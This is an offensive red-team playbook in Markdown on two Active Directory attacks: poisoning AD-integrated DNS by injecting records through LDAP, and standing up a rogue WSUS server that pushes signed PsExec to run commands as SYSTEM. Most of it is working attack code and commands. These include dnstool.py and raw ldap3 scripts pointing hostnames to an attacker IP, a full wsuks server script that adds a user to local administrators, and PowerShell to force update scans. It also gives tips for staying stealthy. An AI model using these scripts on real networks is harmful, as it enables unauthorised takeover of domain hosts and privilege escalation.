# AD-Integrated Service Abuse — ADIDNS Poisoning & Rogue WSUS

---

## ADIDNS Record Injection

AD-integrated DNS stores zone data as `dnsNode` objects in LDAP. By default, **Authenticated Users** have CreateChild rights on the zone container — any domain user can add new DNS records.

### When to use

- Target hostname does not yet exist in the zone (no pre-existing record to overwrite).
- Need to redirect traffic for internal services (WSUS, SCCM, ADFS, internal HTTPS apps).
- LLMNR/NBT-NS poisoning is not viable (disabled, out of subnet, or unicast-only target).
- Machine account creation blocked (MAQ=0) — ADIDNS writes do NOT require a machine account.

### Enumeration

```bash
# List existing records in a zone via LDAP
python3 dnstool.py -u 'domain\user' -p 'pass' --zone domain.local --action query <dc_ip>

# Check if target hostname exists
nslookup <target_hostname> <dc_ip>

# Check zone DN structure (useful for manual LDAP)
# DomainDnsZones: DC=<host>,DC=<zone>,CN=MicrosoftDNS,DC=DomainDnsZones,DC=<domain>,DC=<tld>
# ForestDnsZones: DC=<host>,DC=<zone>,CN=MicrosoftDNS,DC=ForestDnsZones,DC=<domain>,DC=<tld>
```

### Record addition via krbrelayx dnstool.py

```bash
# Add A record (requires: hostname does NOT already exist)
python3 dnstool.py -u 'domain\user' -p 'pass' -r <target_hostname>.domain.local \
  -a add -t A -d <attacker_ip> <dc_ip>

# Verify
nslookup <target_hostname>.domain.local <dc_ip>

# Cleanup
python3 dnstool.py -u 'domain\user' -p 'pass' -r <target_hostname>.domain.local \
  -a remove -t A -d <attacker_ip> <dc_ip>
```

### Record addition via raw LDAP (Python)

Use when dnstool.py is unavailable or you need pass-the-hash auth.

```python
import ldap3, struct

TARGET_IP = '<attacker_ip>'
ip_bytes = bytes(int(x) for x in TARGET_IP.split('.'))

# MS DNS_RPC_RECORD_A structure (28 bytes for A record):
# DataLength(LE u16) Type(LE u16) Version(u8) Rank(u8) Flags(LE u16)
# Serial(LE u32) TtlSeconds(BE u32) Reserved(LE u32) TimeStamp(LE u32)
# Data(4 bytes = IPv4)
#
# CRITICAL: TTL field is BIG-ENDIAN while all other integer fields are LITTLE-ENDIAN
record = struct.pack('<HHBBHI', 4, 1, 5, 0xF0, 0, 100)  # header up to Serial
record += struct.pack('>I', 900)  # TTL in BIG-ENDIAN (900s)
record += struct.pack('<II', 0, 0)  # Reserved, Timestamp
record += ip_bytes  # A record data

s = ldap3.Server('<dc_ip>', port=389)
c = ldap3.Connection(s, user='domain\\user', password='pass',
                     authentication=ldap3.NTLM, auto_bind=True)

dn = 'DC=<hostname>,DC=<zone>,CN=MicrosoftDNS,DC=DomainDnsZones,DC=<domain>,DC=<tld>'
c.add(dn, ['top', 'dnsNode'], {'dnsRecord': [record], 'dNSTombstoned': False})
print(c.result)  # 'success' or error

# If record already exists (result code 68): modify instead
# c.modify(dn, {'dnsRecord': [(ldap3.MODIFY_REPLACE, [record])]})
```

### Record format gotchas

| Field | Endianness | Notes |
|-------|-----------|-------|
| DataLength | Little-endian | 4 for A record, 16 for AAAA |
| Type | Little-endian | 1=A, 28=AAAA, 6=SOA, 33=SRV |
| Version | byte | Always 5 |
| Rank | byte | 0xF0 = zone record (use this) |
| Serial | Little-endian | Match existing records for stealth |
| **TtlSeconds** | **Big-endian** | Common bug: packing as LE makes DNS server ignore or misread |
| Reserved | Little-endian | Always 0 |
| TimeStamp | Little-endian | 0 = static (no aging) |

### Constraints

- **Cannot overwrite existing records** with LDAP add — returns `entryAlreadyExists`. Use `MODIFY_REPLACE` only if you own the node or have write rights.
- **Zone replication** is near-instant for AD-integrated zones on the same DC.
- **Secure dynamic updates** (default): Authenticated Users can create new records but not modify records owned by others.
- **DNS scavenging**: if TimeStamp is 0, record is static and never aged out. Non-zero timestamps may be scavenged.
- **No machine account needed**: this is a pure Authenticated User primitive. MAQ=0 does not affect DNS writes.

---

## Rogue WSUS Server Attack

When Windows hosts fetch updates from a WSUS server via Group Policy, a rogue WSUS endpoint can serve arbitrary executables that run as **NT AUTHORITY\SYSTEM**.

### Prerequisites

| Requirement | How to check | How to satisfy |
|---|---|---|
| WSUS hostname in client GP | `reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer` | Read-only (set by domain policy) |
| WSUS uses HTTPS (port 8531) | Check WUServer URL scheme | Need valid TLS cert trusted by client |
| Enterprise CA trusts attacker cert | Cert issued by domain CA with Server Auth EKU | Use ADCS template with EnrolleeSuppliesSubject (see `certificate-abuse.md` §TLS Service Impersonation) |
| DNS resolves WSUS hostname to attacker | nslookup from target | ADIDNS injection (above) |
| Target reachable from attacker | Network connectivity on 8530/8531 | VPN/pivot must route |

### Attack chain summary

```
1. Enumerate WSUS config → identify hostname + protocol (HTTP/HTTPS)
2. If HTTPS: mint TLS cert via ADCS (→ certificate-abuse.md §TLS Service Impersonation)
3. Poison DNS: ADIDNS record → WSUS hostname resolves to attacker
4. Serve rogue WSUS (wsuks on attacker, with TLS cert)
5. Trigger update scan on target
6. Target downloads and executes payload as SYSTEM
```

### Tool selection: wsuks vs pywsus

| Tool | Server 2016 | Server 2019+ | Notes |
|------|-------------|-------------|-------|
| pywsus | Works | **Fails silently** | Advertises update under wrong product category; client reports "0 updates detected" |
| wsuks | Works | Works | Minimal sync-updates.xml without prerequisite categories |

**Always verify** via `C:\Windows\SoftwareDistribution\ReportingEvents.log` for `[AGENT_DETECTION_FINISHED]` entries.

### wsuks execution

```bash
# Install
pip install wsuks

# Payload: must be Microsoft-signed executable (WSUS enforces Authenticode)
wget https://live.sysinternals.com/PsExec64.exe -O /tmp/PsExec64.exe

# Run server (Python, bypassing nftables dependency since we own DNS):
import ssl, os, threading
from functools import partial
from http.server import HTTPServer
from wsuks.lib.wsusserver import WSUSUpdateHandler, WSUSBaseServer

HOST = '<attacker_ip>'
EXE = '/tmp/PsExec64.exe'
COMMAND = '/accepteula /s cmd.exe /c "net localgroup administrators <user> /add"'

exe_bytes = open(EXE, 'rb').read()
h = WSUSUpdateHandler(exe_bytes, os.path.basename(EXE), f'http://{HOST}:8530')
h.set_resources_xml(COMMAND)

def serve(port, use_tls):
    httpd = HTTPServer((HOST, port), partial(WSUSBaseServer, h))
    if use_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain('wsus_cert.pem', 'wsus_key.pem')
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    httpd.serve_forever()

threading.Thread(target=serve, args=(8530, False), daemon=True).start()
serve(8531, True)  # HTTPS for WSUS SOAP API
```

### Triggering update detection

```powershell
# From a shell on the target (needs basic user access, NOT admin):
wuauclt /resetauthorization /detectnow
usoclient StartScan

# If you have admin (can restart service for clean state):
Stop-Service wuauserv -Force
Remove-Item 'C:\Windows\SoftwareDistribution' -Recurse -Force
Start-Service wuauserv
wuauclt /resetauthorization /detectnow
usoclient StartScan
```

### Expected WSUS handshake flow

```
1. POST /ClientWebService/client.asmx — GetConfig
2. POST /ClientWebService/client.asmx — GetCookie
3. POST /ClientWebService/client.asmx — SyncUpdates
4. POST /ClientWebService/client.asmx — GetExtendedUpdateInfo
5. GET  /<uuid>/PsExec64.exe (Range: bytes=0-1)   ← probe
6. GET  /<uuid>/PsExec64.exe (Range: bytes=0-N)   ← full download
7. Execution as SYSTEM
```

### Verification

```powershell
# Check if payload executed:
net localgroup administrators
# Check WSUS reporting log:
type C:\Windows\SoftwareDistribution\ReportingEvents.log | findstr /i "install"
```

### Key constraints

- **Payload must be Authenticode-signed** by a trusted publisher. Use Microsoft-signed tools (PsExec, bginfo, etc.) with command-line arguments for the actual payload.
- **HTTPS WSUS** requires TLS cert signed by a CA the client trusts (enterprise CA via ADCS).
- **HTTP-only WSUS** (rare, port 8530 only): no TLS cert needed, simpler setup.
- After payload execution, re-authenticate to pick up new group memberships (WinRM sessions cache tokens at connect time).

---

## Related references

- [certificate-abuse.md §TLS Service Impersonation](certificate-abuse.md) — acquiring Server Auth certs for WSUS/SCCM/ADFS impersonation
- [ad-acl-abuse.md §GenericWrite on gMSA](ad-acl-abuse.md) — granting yourself gMSA password read via ACL manipulation
- [ntlm-relay.md](ntlm-relay.md) — alternative coercion/relay paths when DNS poisoning is not viable
